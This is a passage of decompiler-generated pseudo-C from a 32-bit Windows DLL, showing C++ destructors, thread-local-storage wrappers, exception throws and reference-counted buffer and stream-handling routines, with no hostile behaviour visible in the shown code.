  sub_1002A08E(this);
}
// 10094B10: using guessed type int (__thiscall *off_10094B10)(void *Block, char);

//----- (1002A0F5) --------------------------------------------------------
_DWORD *__thiscall sub_1002A0F5(_DWORD *Block, char a2)
{
  sub_1002A0D1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002A114) --------------------------------------------------------
void __thiscall sub_1002A114(_DWORD *this)
{
  *this = &off_10094B18;
  sub_1002A08E(this);
}
// 10094B18: using guessed type int (__thiscall *off_10094B18)(void *Block, char);

//----- (1002A138) --------------------------------------------------------
_DWORD *__thiscall sub_1002A138(_DWORD *Block, char a2)
{
  sub_1002A114(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002A157) --------------------------------------------------------
void __thiscall sub_1002A157(_DWORD *this)
{
  *this = &off_10093CF4;
  sub_1001646C(this);
}
// 10093CF4: using guessed type int (__thiscall *off_10093CF4)(void *Block, char);

//----- (1002A17B) --------------------------------------------------------
_DWORD *__usercall sub_1002A17B@<eax>(_DWORD *a1@<esi>)
{
  DWORD v1; // eax

  *a1 = off_10094B20;
  v1 = TlsAlloc();
  a1[1] = v1;
  if ( v1 == -1 )
    sub_1002A23C();
  return a1;
}
// 1002A23C: using guessed type void __noreturn sub_1002A23C(void);
// 10094B20: using guessed type int (__thiscall *off_10094B20[2])(void *Block, char);

//----- (1002A197) --------------------------------------------------------
_DWORD *__thiscall sub_1002A197(_DWORD *Block, char a2)
{
  sub_1002A1ED(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002A1ED) --------------------------------------------------------
BOOL __thiscall sub_1002A1ED(_DWORD *this)
{
  BOOL result; // eax
  _DWORD pExceptionObject[7]; // [esp+10h] [ebp-1Ch] BYREF

  *this = off_10094B20;
  pExceptionObject[6] = 0;
  result = TlsFree(this[1]);
  if ( !result )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 10094B20: using guessed type int (__thiscall *off_10094B20[2])(void *Block, char);

//----- (1002A23C) --------------------------------------------------------
void __noreturn sub_1002A23C()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_100167F9(pExceptionObject, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 1002A23C: using guessed type void __noreturn sub_1002A23C();
// 1002A23C: using guessed type _DWORD pExceptionObject[3];

//----- (1002A28C) --------------------------------------------------------
int sub_1002A28C()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  if ( GetLastError() )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return 0;
}
// 1002A28C: using guessed type _DWORD pExceptionObject[3];

//----- (1002A2B8) --------------------------------------------------------
void __noreturn sub_1002A2B8()
{
  char pExceptionObject[12]; // [esp+0h] [ebp-10h] BYREF
  int v1; // [esp+Ch] [ebp-4h]

  v1 = 0;
  sub_100167F9(1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 100167F9: using guessed type _DWORD __stdcall sub_100167F9(_DWORD);
// 1002A2B8: using guessed type void __noreturn sub_1002A2B8();
// 1002A2B8: using guessed type char pExceptionObject[12];

//----- (1002A2DB) --------------------------------------------------------
_DWORD *__stdcall sub_1002A2DB(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093D4C;
  return a1;
}
// 10093D4C: using guessed type int (__thiscall *off_10093D4C)(void *Block, char);

//----- (1002A309) --------------------------------------------------------
void __thiscall sub_1002A309(_DWORD *this)
{
  *this = &off_10093D4C;
  sub_1001646C(this);
}
// 10093D4C: using guessed type int (__thiscall *off_10093D4C)(void *Block, char);

//----- (1002A32D) --------------------------------------------------------
_DWORD *__stdcall sub_1002A32D(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093D54;
  return a1;
}
// 10093D54: using guessed type int (__thiscall *off_10093D54)(void *Block, char);

//----- (1002A35B) --------------------------------------------------------
void __thiscall sub_1002A35B(_DWORD *this)
{
  *this = &off_10093D54;
  sub_1001646C(this);
}
// 10093D54: using guessed type int (__thiscall *off_10093D54)(void *Block, char);

//----- (1002A386) --------------------------------------------------------
_DWORD *__thiscall sub_1002A386(_DWORD *Block, char a2)
{
  *Block = &off_10094B24;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094B24: using guessed type int (__thiscall *off_10094B24)(void *Block, char);

//----- (1002A3AD) --------------------------------------------------------
_DWORD *__stdcall sub_1002A3AD(_DWORD *a1, int a2, int a3)
{
  sub_1002F2CA((int)a1, a2, 0);
  a1[4] = a3;
  *a1 = &off_10094B30;
  sub_10016983((void *)1, (int)(a1 + 5), 0);
  return a1;
}
// 10094B30: using guessed type int (__thiscall *off_10094B30)(void *Block, char);

//----- (1002A3F3) --------------------------------------------------------
void *__thiscall sub_1002A3F3(void *Block, char a2)
{
  sub_1002A412((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002A412) --------------------------------------------------------
void __thiscall sub_1002A412(int this)
{
  *(_DWORD *)this = &off_10094B30;
  sub_1002F370((_BYTE *)this);
  sub_10016B53((int *)(this + 20));
  sub_1002F322((_BYTE *)this);
}
// 10094B30: using guessed type int (__thiscall *off_10094B30)(void *Block, char);

//----- (1002A46A) --------------------------------------------------------
int __thiscall sub_1002A46A(void *this, _BYTE *a2)
{
  int v2; // esi
  int v3; // edi

  v2 = (int)this + 20;
  v3 = (*(int (__stdcall **)(int))(*(_DWORD *)this + 12))((int)this + 20);
  if ( v3 )
    *a2 = *(_BYTE *)sub_10016C51(v2, 0);
  return v3;
}

//----- (1002A496) --------------------------------------------------------
int __thiscall sub_1002A496(_DWORD **this, int a2)
{
  int v3; // eax
  int v4; // ebx
  int v6; // eax
  int v7[5]; // [esp+10h] [ebp-48h] BYREF
  int v8[5]; // [esp+24h] [ebp-34h] BYREF
  int v9[7]; // [esp+38h] [ebp-20h] BYREF
  int v10; // [esp+54h] [ebp-4h]

  sub_10016983(*(void **)(a2 + 12), (int)v9, 0);
  v10 = 0;
  v3 = ((int (__thiscall *)(_DWORD **))(*this)[11])(this);
  v4 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v3 + 12))(v3, v9);
  if ( v4 )
  {
    sub_10016E32(v4, (int *)a2, (int)v8, 0);
    LOBYTE(v10) = 1;
    v6 = sub_10016DFF(v4, v9, (int)v7, 0);
    LOBYTE(v10) = 2;
    (*(void (__thiscall **)(_DWORD *, int, int *))(*this[4] + 12))(this[4], v6, v8);
    LOBYTE(v10) = 1;
    sub_10016B53(v7);
    LOBYTE(v10) = 0;
    sub_10016B53(v8);
  }
  v10 = -1;
  sub_10016B53(v9);
  return v4;
}
// 1002A496: using guessed type int var_20[7];
// 1002A496: using guessed type int var_34[5];
// 1002A496: using guessed type int var_48[5];

//----- (1002A52E) --------------------------------------------------------
int __thiscall sub_1002A52E(_DWORD **this, int a2, int a3)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax

  v4 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  v5 = ((int (__thiscall *)(_DWORD **))(*this)[11])(this);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 8))(v5, a2, a3);
  v6 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  return (*(int (__thiscall **)(_DWORD *, int))(*this[4] + 16))(this[4], v6 - v4);
}

//----- (1002A568) --------------------------------------------------------
int __thiscall sub_1002A568(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[4] + 20))(this[4]);
}

//----- (1002A570) --------------------------------------------------------
_DWORD *__stdcall sub_1002A570(_DWORD *a1, int a2, int a3)
{
  sub_10022348((int)a1, a2, 0);
  a1[4] = a3;
  *a1 = &off_10094B64;
  sub_10016983((void *)0x1000, (int)(a1 + 5), 0);
  sub_10016983((void *)1, (int)(a1 + 10), 0);
  return a1;
}
// 10094B64: using guessed type int (__thiscall *off_10094B64)(void *Block, char);

//----- (1002A5C9) --------------------------------------------------------
void *__thiscall sub_1002A5C9(void *Block, char a2)
{
  sub_1002A5E8((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002A5E8) --------------------------------------------------------
int __thiscall sub_1002A5E8(int this)
{
  *(_DWORD *)this = &off_10094B64;
  sub_100223E2((_BYTE *)this);
  sub_10016B53((int *)(this + 40));
  sub_10016B53((int *)(this + 20));
  return sub_100223A0((_BYTE *)this);
}
// 10094B64: using guessed type int (__thiscall *off_10094B64)(void *Block, char);

//----- (1002A64C) --------------------------------------------------------
int __thiscall sub_1002A64C(char *this, char a2)
{
  char *v3; // edi

  v3 = this + 40;
  *(_BYTE *)sub_10016C51((int)(this + 40), 0) = a2;
  return (*(int (__thiscall **)(char *, char *))(*(_DWORD *)this + 12))(this, v3);
}

//----- (1002A672) --------------------------------------------------------
unsigned int __thiscall sub_1002A672(int *this, int *a2)
{
  unsigned int result; // eax
  unsigned int v4; // ecx
  int v5; // ebx
  int v6; // eax
  int v7; // eax
  int v8[5]; // [esp+10h] [ebp-38h] BYREF
  int v9[5]; // [esp+24h] [ebp-24h] BYREF
  unsigned int v10; // [esp+38h] [ebp-10h]
  int v11; // [esp+44h] [ebp-4h]

  result = a2[3];
  v10 = 0;
  if ( result )
  {
    v4 = this[8];
    do
    {
      v5 = result - v10;
      if ( result - v10 >= v4 )
        v5 = v4;
      sub_10016E32(v5, this + 5, (int)v9, 0);
      v11 = 0;
      v6 = sub_10016DFF(v5, a2, (int)v8, v10);
      LOBYTE(v11) = 1;
      (*(void (__thiscall **)(int, int, int *))(*(_DWORD *)this[4] + 12))(this[4], v6, v9);
      LOBYTE(v11) = 0;
      sub_10016B53(v8);
      v7 = (*(int (__thiscall **)(int *))(*this + 36))(this);
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)v7 + 12))(v7, v9);
      v11 = -1;
      sub_10016B53(v9);
      v4 = this[8];
      v10 += v4;
      result = a2[3];
    }
    while ( v10 < result );
  }
  return result;
}
// 1002A672: using guessed type int var_24[5];
// 1002A672: using guessed type int var_38[5];

//----- (1002A70F) --------------------------------------------------------
int __thiscall sub_1002A70F(_DWORD **this, int a2, int a3)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax

  v4 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  v5 = ((int (__thiscall *)(_DWORD **))(*this)[9])(this);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 8))(v5, a2, a3);
  v6 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  return (*(int (__thiscall **)(_DWORD *, int))(*this[4] + 16))(this[4], v6 - v4);
}

//----- (1002A749) --------------------------------------------------------
int __thiscall sub_1002A749(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[4] + 20))(this[4]);
}

//----- (1002A751) --------------------------------------------------------
void __thiscall sub_1002A751(_DWORD *this)
{
  *this = &off_10093E18;
  *this = &off_10093D34;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093E18: using guessed type int (__thiscall *off_10093E18)(void *Block, char);

//----- (1002A776) --------------------------------------------------------
void __thiscall sub_1002A776(_DWORD *this, int a2, volatile LONG *lpAddend)
{
  _DWORD *v3; // esi
  int v4; // ebx
  int v5; // eax
  int v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  void (__thiscall **v9)(int, volatile LONG *, volatile LONG *); // eax
  int v10; // edx
  void (__thiscall **v11)(_DWORD *, int *); // eax
  _BYTE v12[8]; // [esp-18h] [ebp-78h] BYREF
  _DWORD *v13; // [esp-10h] [ebp-70h] BYREF
  volatile LONG *p_Addend; // [esp-Ch] [ebp-6Ch]
  volatile LONG *v15; // [esp-8h] [ebp-68h] BYREF
  volatile LONG *v16; // [esp-4h] [ebp-64h]
  int v17; // [esp+10h] [ebp-50h] BYREF
  unsigned int v18; // [esp+14h] [ebp-4Ch]
  int v19[2]; // [esp+20h] [ebp-40h] BYREF
  volatile LONG *v20; // [esp+28h] [ebp-38h] BYREF
  volatile LONG *v21; // [esp+2Ch] [ebp-34h]
  int v22[2]; // [esp+30h] [ebp-30h] BYREF
  volatile LONG **v23; // [esp+38h] [ebp-28h]
  volatile LONG **v24; // [esp+3Ch] [ebp-24h]
  unsigned int i; // [esp+40h] [ebp-20h]
  _DWORD *v26; // [esp+44h] [ebp-1Ch]
  void *Block; // [esp+48h] [ebp-18h]
  LONG Addend; // [esp+4Ch] [ebp-14h] BYREF
  unsigned int v29; // [esp+50h] [ebp-10h]
  int v30; // [esp+5Ch] [ebp-4h]

  v3 = this;
  v26 = this;
  v30 = 0;
  sub_1000CC20(&v20, word_100B6F24);
  LOBYTE(v30) = 1;
  v4 = a2;
  (*(void (__thiscall **)(int, int *, volatile LONG **))(*(_DWORD *)a2 + 96))(a2, &v17, &v20);
  LOBYTE(v30) = 3;
  sub_1000CE59((int *)&v20);
  v29 = 0;
  for ( i = v18; v29 < i; ++v29 )
  {
    v5 = (*(int (__thiscall **)(int *, unsigned int))(v17 + 44))(&v17, v29);
    sub_1000CE26(v22, v5);
    LOBYTE(v30) = 4;
    v6 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v4 + 84))(v4, v22);
    if ( v6 >= 4 )
    {
      if ( v6 <= 10 )
      {
        v10 = *(_DWORD *)v4;
        v16 = (volatile LONG *)v6;
        v23 = (volatile LONG **)v12;
        (*(void (__thiscall **)(int, _BYTE *, int *, int))(v10 + 68))(v4, v12, v22, v6);
        LOBYTE(v30) = 14;
        v11 = (void (__thiscall **)(_DWORD *, int *))(*v3 + 44);
        LOBYTE(v30) = 4;
        (*v11)(v3, v22);
      }
      else if ( v6 == 11 )
      {
        Addend = 1;
        Block = operator new(0x24u);
        LOBYTE(v30) = 5;
        if ( Block )
        {
          v15 = v16;
          v24 = &v15;
          sub_1000CE26(&v15, (int)v22);
          LOBYTE(v30) = 6;
          p_Addend = &Addend;
          v13 = v3;
          v23 = (volatile LONG **)&v13;
          InterlockedIncrement(&Addend);
          LOBYTE(v30) = 5;
          v7 = sub_10018255(Block, (int)v13, p_Addend, (int)v15, (int)v16);
        }
        else
        {
          v7 = 0;
        }
        LOBYTE(v30) = 4;
        sub_10003BC8(v19, (int)v7);
        LOBYTE(v30) = 8;
        Block = operator new(0x24u);
        LOBYTE(v30) = 9;
        if ( Block )
        {
          v15 = v16;
          v23 = &v15;
          sub_1000CE26(&v15, (int)v22);
          LOBYTE(v30) = 10;
          v24 = (volatile LONG **)&v13;
          p_Addend = lpAddend;
          v13 = (_DWORD *)v4;
          InterlockedIncrement(lpAddend);
          LOBYTE(v30) = 9;
          v8 = sub_10018255(Block, (int)v13, p_Addend, (int)v15, (int)v16);
        }
        else
        {
          v8 = 0;
        }
        LOBYTE(v30) = 8;
        sub_10003BC8(&v20, (int)v8);
        LOBYTE(v30) = 12;
        v23 = &v15;
        v16 = v21;
        v15 = v20;
        InterlockedIncrement(v21);
        LOBYTE(v30) = 13;
        v9 = (void (__thiscall **)(int, volatile LONG *, volatile LONG *))(*(_DWORD *)v19[0] + 16);
        LOBYTE(v30) = 12;
        (*v9)(v19[0], v15, v16);
        LOBYTE(v30) = 8;
        sub_10003C0C(&v20);
        LOBYTE(v30) = 4;
        sub_10003C0C(v19);
        v3 = v26;
      }
    }
    LOBYTE(v30) = 3;
    sub_1000CE59(v22);
  }
  LOBYTE(v30) = 0;
  sub_10002CF0(&v17);
  v30 = -1;
  sub_10003C0C(&a2);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100B6F24: using guessed type wchar_t word_100B6F24[4];

//----- (1002A992) --------------------------------------------------------
LONG __thiscall sub_1002A992(int *this)
{
  *this = (int)&off_10094BA0;
  return sub_1000CE59(this + 1);
}
// 10094BA0: using guessed type int (__thiscall *off_10094BA0)(void *Block, char);

//----- (1002A9B9) --------------------------------------------------------
int *__thiscall sub_1002A9B9(int *Block, char a2)
{
  sub_1002A992(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002A9D8) --------------------------------------------------------
int *__stdcall sub_1002A9D8(int *a1, int a2, int a3, volatile LONG *lpAddend, int a5)
{
  int v5; // ebx
  volatile LONG *v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // ebx
  volatile LONG *v10; // ecx
  volatile LONG *v12; // [esp-8h] [ebp-4Ch] BYREF
  volatile LONG *v13; // [esp-4h] [ebp-48h]
  int v14[5]; // [esp+10h] [ebp-34h] BYREF
  int v15[7]; // [esp+24h] [ebp-20h] BYREF
  int v16; // [esp+40h] [ebp-4h]

  v16 = 0;
  sub_10035466(a1, a2);
  v5 = a3;
  a1[4] = a5;
  v6 = lpAddend;
  *a1 = (int)&off_10094B94;
  a1[5] = 0;
  v13 = v6;
  a1[7] = (int)v6;
  a1[6] = v5;
  InterlockedIncrement(v13);
  LOBYTE(v16) = 2;
  sub_10016AE9((_DWORD *)(v5 + 4), (int)v15);
  LOBYTE(v16) = 3;
  v7 = sub_10016E72(v15, 4);
  v13 = 0;
  a1[8] = v7;
  v8 = sub_10016E72(v15, (int)v13);
  v9 = v15[3];
  a1[9] = v8;
  sub_10016DFF(v9 - 8, v15, (int)v14, 8);
  LOBYTE(v16) = 4;
  v13 = v10;
  v12 = v10;
  sub_1000C6F3(&v12);
  LOBYTE(v16) = 4;
  sub_100354D6(a1, (int)v12, (int)v13);
  LOBYTE(v16) = 3;
  sub_10016B53(v14);
  LOBYTE(v16) = 2;
  sub_10016B53(v15);
  v16 = -1;
  sub_10019BCB((void **)&a3);
  return a1;
}
// 1002AA60: variable 'v10' is possibly undefined
// 10094B94: using guessed type int (__thiscall *off_10094B94)(void *Block, char);
// 1002A9D8: using guessed type int var_34[5];

//----- (1002AAAE) --------------------------------------------------------
void *__thiscall sub_1002AAAE(void *Block, char a2)
{
  sub_1002AACE((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002AACE) --------------------------------------------------------
LONG __stdcall sub_1002AACE(int a1)
{
  sub_10019BCB((void **)(a1 + 24));
  return sub_1002A992((int *)a1);
}

//----- (1002AAFD) --------------------------------------------------------
_DWORD *__stdcall sub_1002AAFD(_DWORD *a1, int a2, int a3, int a4, void *Block, int a6)
{
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  void *v9; // ecx
  int *v11; // [esp-4h] [ebp-54h]
  _DWORD *v12; // [esp+0h] [ebp-50h] BYREF
  void *v13; // [esp+4h] [ebp-4Ch]
  int v14[5]; // [esp+18h] [ebp-38h] BYREF
  int v15[8]; // [esp+2Ch] [ebp-24h] BYREF
  int v16; // [esp+4Ch] [ebp-4h]

  v16 = 0;
  v15[5] = (int)&v12;
  sub_1000CE26(&v12, (int)&a3);
  LOBYTE(v16) = 0;
  sub_10035420(a1, a2, (int)v12, (int)v13);
  LOBYTE(v16) = 2;
  v13 = 0;
  *a1 = &off_10094B94;
  a1[4] = 0;
  a1[5] = 0;
  sub_10019B8C(a1 + 6, (int)v13);
  LOBYTE(v16) = 3;
  v13 = 0;
  a1[9] = Block;
  sub_10016983((void *)8, (int)v15, v13);
  LOBYTE(v16) = 4;
  sub_10016E93(v15, 0, a1[9]);
  sub_10016E93(v15, 4, a1[8]);
  v6 = sub_1000C7A8((int)(a1 + 1), v14);
  LOBYTE(v16) = 5;
  sub_10016CD5(v6, (int)v15);
  LOBYTE(v16) = 4;
  sub_10016B53(v14);
  v7 = operator new(0x20u);
  Block = v7;
  LOBYTE(v16) = 6;
  if ( v7 )
    v8 = sub_1002D6D1(v15, v7, 3);
  else
    v8 = 0;
  LOBYTE(v16) = 4;
  sub_1002AE03((int)v8, (int)(a1 + 6));
  v13 = v9;
  v12 = v9;
  v13 = (void *)a1[7];
  v12 = (_DWORD *)a1[6];
  InterlockedIncrement((volatile LONG *)v13);
  LOBYTE(v16) = 7;
  v11 = *(int **)(a1[3] + 24);
  LOBYTE(v16) = 4;
  sub_1002E679(v11, v12, (volatile LONG *)v13);
  sub_1002AC32(a6, a1);
  LOBYTE(v16) = 3;
  sub_10016B53(v15);
  v16 = -1;
  sub_1000CE59(&a3);
  return a1;
}
// 1002ABD5: variable 'v9' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10094B94: using guessed type int (__thiscall *off_10094B94)(void *Block, char);
// 1002AAFD: using guessed type int var_38[5];

//----- (1002AC32) --------------------------------------------------------
LONG __fastcall sub_1002AC32(int a1, _DWORD *a2)
{
  volatile LONG *v4; // eax
  volatile LONG *v5; // ecx
  _DWORD *v6; // ecx
  int *v7; // edi
  int v9; // [esp-8h] [ebp-44h] BYREF
  volatile LONG *v10; // [esp-4h] [ebp-40h]
  int *v11; // [esp+14h] [ebp-28h]
  int v12[6]; // [esp+18h] [ebp-24h] BYREF
  int v13; // [esp+38h] [ebp-4h]

  if ( a1 )
    *(_DWORD *)(a1 + 16) = a2;
  sub_10016AE9((_DWORD *)(a2[6] + 4), (int)v12);
  v4 = 0;
  v13 = 0;
  a2[5] = a1;
  if ( a1 )
    v4 = *(volatile LONG **)(*(_DWORD *)(a1 + 24) + 28);
  if ( v4 != (volatile LONG *)a2[8] )
  {
    v10 = v4;
    v9 = 4;
    a2[8] = v4;
    sub_10016E93(v12, v9, (int)v10);
    sub_10016B2F(v12, a2[6] + 4);
    v10 = v5;
    v9 = (int)v5;
    v10 = (volatile LONG *)a2[7];
    v6 = (_DWORD *)a2[6];
    v11 = &v9;
    v9 = (int)v6;
    InterlockedIncrement(v10);
    LOBYTE(v13) = 1;
    v7 = *(int **)(a2[3] + 24);
    LOBYTE(v13) = 0;
    sub_1002E554(v7, (_DWORD *)v9, v10);
  }
  v13 = -1;
  return sub_10016B53(v12);
}
// 1002ACAF: variable 'v5' is possibly undefined
// 1002AC32: using guessed type int var_24[6];

//----- (1002AD03) --------------------------------------------------------
LONG __thiscall sub_1002AD03(_DWORD *this, int a2)
{
  int v3; // eax
  int *v4; // edi
  _DWORD *v6; // [esp-8h] [ebp-3Ch]
  volatile LONG *v7; // [esp-4h] [ebp-38h]
  int v8[7]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  sub_10016AE9((_DWORD *)(this[6] + 4), (int)v8);
  v9 = 0;
  if ( sub_10016E72(v8, 0) != a2 )
  {
    sub_10016E93(v8, 0, a2);
    v3 = this[6];
    this[9] = a2;
    sub_10016B2F(v8, v3 + 4);
    v7 = (volatile LONG *)this[7];
    v6 = (_DWORD *)this[6];
    InterlockedIncrement(v7);
    LOBYTE(v9) = 1;
    v4 = *(int **)(this[3] + 24);
    LOBYTE(v9) = 0;
    sub_1002E554(v4, v6, v7);
  }
  v9 = -1;
  return sub_10016B53(v8);
}
// 1002AD03: using guessed type int var_20[7];

//----- (1002AD94) --------------------------------------------------------
int __thiscall sub_1002AD94(int this)
{
  _DWORD *v2; // edx

  v2 = *(_DWORD **)(this + 16);
  if ( v2 )
    sub_1002AC32(*(_DWORD *)(this + 20), v2);
  else
    sub_1002B1FF(*(_DWORD **)(this + 12), *(_DWORD *)(this + 20));
  sub_1002E609(*(int **)(*(_DWORD *)(this + 12) + 24), *(_DWORD *)(*(_DWORD *)(this + 24) + 28));
  sub_1002E609(*(int **)(*(_DWORD *)(this + 12) + 24), *(_DWORD *)(this + 36));
  return 1;
}

//----- (1002ADF0) --------------------------------------------------------
int sub_1002ADF0()
{
  return 1;
}

//----- (1002AE03) --------------------------------------------------------
void __usercall sub_1002AE03(int a1@<edi>, int a2@<esi>)
{
  _DWORD *v2; // eax

  if ( *(_DWORD *)a2 != a1 )
  {
    sub_10019D9A((void **)a2);
    v2 = operator new(4u);
    if ( v2 )
      *v2 = 1;
    else
      v2 = 0;
    *(_DWORD *)(a2 + 4) = v2;
    *(_DWORD *)a2 = a1;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002AE46) --------------------------------------------------------
int *__cdecl sub_1002AE46(int *a1, void *a2)
{
  _DWORD *v2; // eax
  int v3; // eax
  unsigned int v4; // esi
  int *v5; // ebx
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // edx
  int v10; // [esp-10h] [ebp-80h]
  int v11; // [esp-Ch] [ebp-7Ch] BYREF
  volatile LONG *v12; // [esp-8h] [ebp-78h] BYREF
  volatile LONG *v13; // [esp-4h] [ebp-74h]
  int v14[5]; // [esp+10h] [ebp-60h] BYREF
  int v15[2]; // [esp+24h] [ebp-4Ch] BYREF
  _DWORD v16[2]; // [esp+2Ch] [ebp-44h] BYREF
  int v17[2]; // [esp+34h] [ebp-3Ch] BYREF
  int v18; // [esp+3Ch] [ebp-34h] BYREF
  volatile LONG *v19; // [esp+40h] [ebp-30h]
  volatile LONG *v20; // [esp+44h] [ebp-2Ch] BYREF
  volatile LONG *v21; // [esp+48h] [ebp-28h]
  int v22[3]; // [esp+4Ch] [ebp-24h] BYREF
  void *v23; // [esp+58h] [ebp-18h]
  int v24; // [esp+5Ch] [ebp-14h]
  void *Block; // [esp+60h] [ebp-10h]
  int v26; // [esp+6Ch] [ebp-4h]

  v26 = 0;
  v24 = 0;
  sub_1002E062((int)a2, &v20, 0x1Au);
  v26 = 1;
  Block = operator new(0x1Cu);
  LOBYTE(v26) = 2;
  if ( Block )
  {
    v13 = v21;
    v23 = &v12;
    v12 = v20;
    InterlockedIncrement(v21);
    LOBYTE(v26) = 2;
    v2 = sub_1002B11F(Block, a2, (int)v12, v13);
  }
  else
  {
    v2 = 0;
  }
  LOBYTE(v26) = 1;
  sub_10019CB7(a1, (int)v2);
  v24 = 1;
  sub_10016AE9((_DWORD *)v20 + 1, (int)v14);
  LOBYTE(v26) = 4;
  v3 = sub_10016E72(v14, 0);
  Block = 0;
  v4 = v3;
  while ( v4 )
  {
    sub_1002E062((int)a2, &v18, v4);
    LOBYTE(v26) = 5;
    v23 = operator new(0x28u);
    LOBYTE(v26) = 6;
    if ( v23 )
    {
      v13 = (volatile LONG *)Block;
      v12 = v19;
      v22[2] = (int)&v11;
      v11 = v18;
      InterlockedIncrement(v19);
      LOBYTE(v26) = 7;
      v10 = *a1;
      LOBYTE(v26) = 6;
      v5 = sub_1002A9D8((int *)v23, v10, v11, v12, (int)v13);
    }
    else
    {
      v5 = 0;
    }
    LOBYTE(v26) = 5;
    sub_1002B4BC(v22, (int)v5);
    LOBYTE(v26) = 8;
    v6 = sub_100354A1(v22[0], v15);
    LOBYTE(v26) = 9;
    sub_10012A7C(v17, (int)v6);
    LOBYTE(v26) = 10;
    v7 = sub_1002B1C2(*a1, v16);
    LOBYTE(v26) = 11;
    sub_1002B965((_DWORD *)*v7, (int)v17, v22, 0);
    LOBYTE(v26) = 10;
    sub_10019C27(v16);
    LOBYTE(v26) = 9;
    sub_10012AAC(v17);
    LOBYTE(v26) = 8;
    sub_1000CE59(v15);
    v8 = Block;
    ++*(_DWORD *)*a1;
    if ( v8 )
      sub_1002AC32((int)v5, v8);
    else
      sub_1002B1FF((_DWORD *)*a1, (int)v5);
    v4 = *(_DWORD *)(v22[0] + 32);
    Block = v5;
    LOBYTE(v26) = 5;
    sub_10019D52(v22);
    LOBYTE(v26) = 4;
    sub_10019BCB((void **)&v18);
  }
  LOBYTE(v26) = 1;
  sub_10016B53(v14);
  LOBYTE(v26) = 0;
  sub_10019BCB((void **)&v20);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1002AE46: using guessed type int var_60[5];
// 1002AE46: using guessed type _DWORD var_44[2];

//----- (1002B023) --------------------------------------------------------
_DWORD *__cdecl sub_1002B023(_DWORD *a1, int *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  volatile LONG *v4; // esi
  _DWORD *v5; // ebx
  _DWORD *v6; // eax
  _DWORD *v8; // [esp-8h] [ebp-4Ch] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-48h]
  int v10[5]; // [esp+10h] [ebp-34h] BYREF
  _DWORD *v11; // [esp+24h] [ebp-20h] BYREF
  volatile LONG *lpAddend; // [esp+28h] [ebp-1Ch]
  _DWORD **v13; // [esp+2Ch] [ebp-18h]
  int v14; // [esp+30h] [ebp-14h]
  void *Block; // [esp+34h] [ebp-10h]
  int v16; // [esp+40h] [ebp-4h]

  v14 = 0;
  sub_10016983((void *)4, (int)v10, 0);
  v16 = 1;
  sub_10016E93(v10, 0, 0);
  v2 = operator new(0x20u);
  Block = v2;
  LOBYTE(v16) = 2;
  if ( v2 )
    v3 = sub_1002D6D1(v10, v2, 2);
  else
    v3 = 0;
  LOBYTE(v16) = 1;
  sub_10019B8C(&v11, (int)v3);
  LOBYTE(v16) = 3;
  v4 = lpAddend;
  v5 = v11;
  Block = &v8;
  v9 = lpAddend;
  v8 = v11;
  InterlockedIncrement(lpAddend);
  LOBYTE(v16) = 3;
  sub_1002E679(a2, v8, v9);
  Block = operator new(0x1Cu);
  LOBYTE(v16) = 5;
  if ( Block )
  {
    v13 = &v8;
    v9 = v4;
    v8 = v5;
    InterlockedIncrement(v4);
    LOBYTE(v16) = 5;
    v6 = sub_1002B11F(Block, a2, (int)v8, v9);
  }
  else
  {
    v6 = 0;
  }
  LOBYTE(v16) = 3;
  sub_10019CB7(a1, (int)v6);
  v14 = 1;
  LOBYTE(v16) = 1;
  sub_10019BCB((void **)&v11);
